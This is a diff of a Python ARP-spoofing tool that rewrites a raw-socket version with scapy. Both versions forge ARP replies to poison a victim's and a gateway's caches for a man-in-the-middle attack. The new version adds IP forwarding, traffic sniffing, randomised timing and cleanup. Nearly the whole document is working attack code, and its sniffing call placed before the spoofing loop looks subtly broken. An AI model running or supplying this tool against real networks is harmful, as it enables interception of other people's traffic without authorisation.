@@ -1,196 +1,158 @@
-import socket
-import struct
 import sys
 import time
 import argparse
+import psutil
+import signal
+import random
+from scapy.all import ARP, Ether, srp, sendp, sniff, conf
 
 FILE_ip_forward = "/proc/sys/net/ipv4/ip_forward"
 
 
 def parse_args():
-    parser = argparse.ArgumentParser(
-        description="usage: ARPspoof.py -sourceIP [IPADDRESS] -sourceMAC [MACADDRESS] -dstIP [IPADDRESS] -dstMAC [MACADDRESS] -i eth0",
-        formatter_class=argparse.ArgumentDefaultsHelpFormatter
-    )
-
-    parser.add_argument("-sourceIP", required=True, help="IP you want to spoof (web app, router, ...)")
-    parser.add_argument("-sourceMAC", required=True, help="attacker MAC where to redirect trafic")
-    parser.add_argument("-dstIP", required=True, help="IP address of destination (target)")
-    parser.add_argument("-dstMAC", required=False, help="the MAC of targeted device that you want to Mitm (or ff:ff:ff:ff:ff:ff) (optional)")
-    parser.add_argument("-i", "--interface", required=True, help="Network interface to listen to (eth0, wlan0)")
-
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-t", "--target", required=True, help="Target IP")
+    parser.add_argument("-i", "--interface", required=True)
+    parser.add_argument("--both", action="store_true", help="Enable full MITM (victim <-> gateway)")
     return parser.parse_args()
 
 
-def mac_to_bytes(mac_str):
-    return bytes.fromhex(mac_str.replace(":", ""))
+def get_interface_config(i):
+    addrs = psutil.net_if_addrs().get(i, [])
+    ipv4, mac = None, None
+
+    for addr in addrs:
+        if addr.family.name == 'AF_INET':
+            ipv4 = addr.address
+        elif addr.family.name in ('AF_PACKET', 'AF_LINK'):
+            mac = addr.address
+
+    return ipv4, mac
 
 
-def check_ip_forwarding():
+def get_gateway():
+    return conf.route.route("0.0.0.0")[2]
+
+
+def arp_request(ip, iface):
+    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
+    result = srp(pkt, timeout=2, iface=iface, verbose=0)[0]
+
+    for _, r in result:
+        return r.hwsrc
+    return None
+
+
+def enable_ip_forward():
     try:
-        with open(FILE_ip_forward, 'r', encoding='utf-8') as f:
-            if f.read().strip() == '1':
-                print('[+] IP forwarding enabled')
-                return True
-    except Exception as e:
-        print(f"[!] Error reading {FILE_ip_forward}: {e}")
-        return False
-
-    return False
+        with open(FILE_ip_forward, "w") as f:
+            f.write("1")
+    except:
+        print("[!] Failed to enable IP forwarding")
 
 
-def build_arp_frame(src_mac, src_ip, dst_mac, dst_ip):
-    eth_header = dst_mac + src_mac + b'\x08\x06'
+def restore(victim_ip, victim_mac, gw_ip, gw_mac, iface, bidirectional):
+    print("[+] Restoring network...")
 
-    arp_payload = struct.pack(
-        "!HHBBH6s4s6s4s",
-        1,
-        0x0800,
-        6,
-        4,
-        2,
-        src_mac,
-        socket.inet_aton(src_ip),
-        dst_mac,
-        socket.inet_aton(dst_ip)
+    # restore victim
+    sendp(Ether(dst=victim_mac) / ARP(
+        op=2,
+        psrc=gw_ip,
+        hwsrc=gw_mac,
+        pdst=victim_ip,
+        hwdst=victim_mac
+    ), iface=iface, count=3, verbose=0)
+
+    # restore gateway
+    if bidirectional:
+        sendp(Ether(dst=gw_mac) / ARP(
+            op=2,
+            psrc=victim_ip,
+            hwsrc=victim_mac,
+            pdst=gw_ip,
+            hwdst=gw_mac
+        ), iface=iface, count=3, verbose=0)
+
+
+def spoof_once(victim_ip, victim_mac, gw_ip, gw_mac, attacker_mac, iface, bidirectional):
+    # Victime -> attaquant (spoof gateway)
+    pkt1 = Ether(dst=victim_mac, src=attacker_mac) / ARP(
+        op=2,
+        psrc=gw_ip,
+        hwsrc=attacker_mac,
+        pdst=victim_ip,
+        hwdst=victim_mac
     )
 
-    return eth_header + arp_payload
+    print(f"[ARP reply] {gw_ip} is-at {attacker_mac} → {victim_ip}")
+    sendp(pkt1, iface=iface, verbose=0)
+
+    if bidirectional:
+        # Gateway -> attacker (spoof victim)
+        pkt2 = Ether(dst=gw_mac, src=attacker_mac) / ARP(
+            op=2,
+            psrc=victim_ip,
+            hwsrc=attacker_mac,
+            pdst=gw_ip,
+            hwdst=gw_mac
+        )
+
+        print(f"[ARP reply] {victim_ip} is-at {attacker_mac} → {gw_ip}")
+        sendp(pkt2, iface=iface, verbose=0)
 
 
-def create_socket(interface):
-    try:
-        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
-        s.bind((interface, 0))
-        return s
-    except PermissionError:
-        print("[!] Root privileges required")
-        sys.exit(1)
-    except OSError as e:
-        print(f"[!] Socket error on interface '{interface}': {e}")
-        sys.exit(1)
+def packet_callback(pkt):
+    if pkt.haslayer("IP"):
+        print(f"[TRAFFIC] {pkt['IP'].src} -> {pkt['IP'].dst}")
 
-
-def build_arp_request(src_mac, src_ip, target_ip):
-    broadcast = b'\xff\xff\xff\xff\xff\xff'
-
-    eth_header = broadcast + src_mac + b'\x08\x06'
-
-    arp_payload = struct.pack(
-        "!HHBBH6s4s6s4s",
-        1,                  # Ethernet
-        0x0800,             # IPv4
-        6,
-        4,
-        1,                  # Opcode request
-        src_mac,
-        socket.inet_aton(src_ip),
-        b'\x00\x00\x00\x00\x00\x00',
-        socket.inet_aton(target_ip)
-    )
-
-    return eth_header + arp_payload
-
-def arp_request(interface, src_mac, src_ip, target_ip, timeout=2):
-    # Create raw socket
-    try:
-        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
-        s.bind((interface, 0))
-    except PermissionError:
-        print("[!] Root privileges required")
-        return None
-
-    # Broadcast MAC
-    broadcast = b'\xff\xff\xff\xff\xff\xff'
-
-    # Ethernet header
-    eth_header = broadcast + src_mac + b'\x08\x06'
-
-    # ARP request payload
-    arp_payload = struct.pack(
-        "!HHBBH6s4s6s4s",
-        1,                      # Ethernet
-        0x0800,                 # IPv4
-        6,                      # MAC length
-        4,                      # IP length
-        1,                      # Opcode (request)
-        src_mac,
-        socket.inet_aton(src_ip),
-        b'\x00\x00\x00\x00\x00\x00',
-        socket.inet_aton(target_ip)
-    )
-
-    frame = eth_header + arp_payload
-
-    # Send request
-    s.send(frame)
-
-    s.settimeout(timeout)
-
-    try:
-        while True:
-            data, _ = s.recvfrom(65535)
-
-            # Ethernet type = ARP
-            eth_type = data[12:14]
-            if eth_type != b'\x08\x06':
-                continue
-
-            # Extract ARP payload
-            arp_packet = data[14:42]
-            unpacked = struct.unpack("!HHBBH6s4s6s4s", arp_packet)
-
-            opcode = unpacked[4]
-            sender_mac = unpacked[5]
-            sender_ip = socket.inet_ntoa(unpacked[6])
-
-            # We only want ARP replies for our target IP
-            if opcode == 2 and sender_ip == target_ip:
-                s.close()
-                return ':'.join(f'{b:02x}' for b in sender_mac)
-
-    except socket.timeout:
-        s.close()
-        return None
 
 def main():
     args = parse_args()
 
-    if not check_ip_forwarding():
-        print("[!] Warning: IP forwarding is disabled. You should run sudo sysctl -w net.ipv4.ip_forward=1")
+    victim_ip = args.target
+    iface = args.interface
+    bidirectional = args.both
 
-    src_mac = mac_to_bytes(args.sourceMAC)
-    interface = args.interface
-    
-    if not args.dstMAC:
-        dstMAC = arp_request(interface=interface,src_mac=src_mac,src_ip=args.sourceIP,target_ip=args.dstIP)
-        if not dstMAC:
-            sys.exit(f"[!] Could not find the MAC address for {args.sourceIP}. Try specify it with -dstMAC.")
-        dst_mac = mac_to_bytes(dstMAC)
-        print(f"[+] Found target MAC address for {args.dstIP}:  {dstMAC}")
-    else:
-        dstMAC = args.dstMAC
-        dst_mac = mac_to_bytes(dstMAC)
-        
-    
-    sock = create_socket(interface)
+    attacker_ip, attacker_mac = get_interface_config(iface)
 
-    try: 
+    if not attacker_ip or not attacker_mac:
+        sys.exit("[!] Could not get interface config")
+
+    gw_ip = get_gateway()
+
+    print(f"[+] Victim: {victim_ip}")
+    print(f"[+] Gateway: {gw_ip}")
+    print(f"[+] Mode: {'MITM' if bidirectional else 'Unidirectional'}")
+
+    victim_mac = arp_request(victim_ip, iface)
+    gw_mac = arp_request(gw_ip, iface)
+
+    if not victim_mac or not gw_mac:
+        sys.exit("[!] Failed to resolve MAC addresses")
+
+    print(f"[+] Victim MAC: {victim_mac}")
+    print(f"[+] Gateway MAC: {gw_mac}")
+
+    if bidirectional:
+        enable_ip_forward()
+
+    def cleanup(signum=None, frame=None):
+        restore(victim_ip, victim_mac, gw_ip, gw_mac, iface, bidirectional)
+        sys.exit(0)
+
+    signal.signal(signal.SIGINT, cleanup)
+
+    print("[+] Attack started...\n")
+
+    sniff(prn=packet_callback, iface=iface, store=0, filter="ip", timeout=0, count=0)
+
+    try:
         while True:
-            frame = build_arp_frame(
-                src_mac,
-                args.sourceIP,
-                dst_mac,
-                args.dstIP
-            )
-            sock.send(frame)
-            print(f"[+] ARP frame sent to {args.dstIP}/{dstMAC} <-> {args.sourceIP} is at {args.sourceMAC}")
-            time.sleep(1)
+            spoof_once(victim_ip, victim_mac, gw_ip, gw_mac, attacker_mac, iface, bidirectional)
+            time.sleep(random.uniform(1, 2))
 
-    except KeyboardInterrupt:
-        print("\n[+] Stopped by user")
     finally:
-        sock.close()
+        cleanup()
 
 
 if __name__ == "__main__":
